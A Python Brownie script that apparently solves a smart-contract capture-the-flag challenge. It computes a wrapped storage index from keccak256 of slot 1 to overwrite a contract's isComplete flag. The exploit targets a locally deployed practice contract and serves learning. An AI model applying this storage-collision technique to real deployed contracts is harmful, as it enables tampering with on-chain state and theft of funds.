#!/usr/bin/python3
from time import time

from brownie import web3
from colorama import Fore
from scripts.deploy import deploy
from scripts.helpful_scripts import get_account

# * colours
green = Fore.GREEN
red = Fore.RED
blue = Fore.BLUE
magenta = Fore.MAGENTA
reset = Fore.RESET


def print_colour(solved):
    if solved:
        print(f"{blue}Is complete: {green}{True}{reset}")
    else:
        print(f"{blue}Is complete: {red}{solved}{reset}")


def hack(contract_address=None, attacker=None):
    if not contract_address:
        target, _ = deploy()
        attacker = get_account()
    else:
        print(f"{red}Something is wrong{reset}")
        exit(-1)

    print_colour(target.isComplete())

    MAX_UINT256 = 2**256
    # print(MAX_UINT256)

    # * Expand the map to it max capacity
    # ? as key + 1 => 2^256 - 2 + 1 => 2^256 - 1
    # target.set(MAX_UINT256 - 2, 1).wait(1)

    # * address of the first slot
    mapStartAddr = "0x0000000000000000000000000000000000000000000000000000000000000001"

    # mapDataSlot = int.from_bytes(web3.sha3(text=mapStartAddr), byteorder="big")
    mapDataSlot = int(web3.keccak(hexstr=mapStartAddr).hex(), 16)

    # print(web3.keccak(hexstr=mapStartAddr).hex())
    print(mapDataSlot)

    # * need to find index at this location now that maps to 0 mod 2^256
    # * i.e., 0 - keccak(1) mod 2^256 <=> 2^256 - keccak(1) as keccak(1) is in range
    isCompleteSlot = MAX_UINT256 - mapDataSlot
    print(isCompleteSlot)

    target.set(isCompleteSlot, 1).wait(1)

    print_colour(target.isComplete())

    assert target.isComplete() == True


def main(contract_address=None):
    if contract_address:
        hack(contract_address, get_account())
    else:
        hack()


if __name__ == "__main__":
    main()
